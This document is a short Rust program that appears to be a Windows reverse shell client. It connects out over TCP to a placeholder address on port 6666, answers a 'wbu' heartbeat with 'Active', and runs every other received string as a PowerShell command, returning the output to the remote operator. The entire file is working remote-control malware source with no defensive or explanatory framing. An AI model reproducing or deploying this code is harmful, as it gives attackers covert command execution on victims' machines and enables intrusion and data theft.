use async_process::Command;
use async_std::{
    net::{TcpStream, ToSocketAddrs},
    prelude::*,
    task,
};
use std::{error::Error, result::Result};

#[async_std::main]
async fn main() -> Result<(), Box<dyn Error + Send + Sync>> {
    task::block_on(try_run("ip:6666"))
}
async fn try_run(addr: impl ToSocketAddrs) -> Result<(), Box<dyn Error + Send + Sync>> {
    let mut stream = TcpStream::connect(addr).await?;

    'myloop: loop {
        let mut command = [0; 9999];
        stream.read(&mut command).await?;
        let cmd_command = String::from_utf8_lossy(&command[..]).to_string();
        let result_command = cmd_command.trim_matches(char::from(0));
        if result_command == "wbu"{
            stream.write_all("Active".as_bytes()).await?;
        }else {
            let output = Command::new("powershell")
            // .arg("/C")
             .arg(result_command)
             .output()
             .await;
         
         let result = match output {
             Ok(output) => {
                 if !output.stderr.is_empty() {
                     //   println!("{}", &String::from_utf8_lossy(&output.stderr).to_string());
                     stream.write_all("Wrong Command".as_bytes()).await?;
                     continue 'myloop;
                 } else {
                     let result = output.stdout;
                     let stdout = String::from_utf8(result).expect("invalid utf8 output");
                     let res = stdout.trim_matches(char::from(0));
                     stream.write_all(res.as_bytes()).await?;
                     continue 'myloop;
                 }
             }
             Err(_) => stream.write_all("Wrong Command".as_bytes()),
         };
        }

    }
}
